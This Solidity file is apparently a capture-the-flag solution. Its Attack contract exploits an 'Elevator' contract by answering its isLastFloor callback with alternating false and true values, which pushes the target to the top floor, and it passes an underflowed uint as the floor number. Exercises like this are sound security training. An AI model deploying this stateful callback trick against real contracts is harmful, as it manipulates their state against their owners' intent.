pragma solidity ^0.6.0;

contract Elevator {
  function goTo(uint _floor) public {}
}


contract Attack {

  Elevator public e;
  bool public toggle = true;

  constructor(address target) public {
    e = Elevator(target);
  }

  function goToTop() public {
    uint top = 0;
    top -= 1;
    e.goTo(top);
  }

  function isLastFloor(uint) external returns (bool) {
    toggle = !toggle;
    return toggle;
  }
}
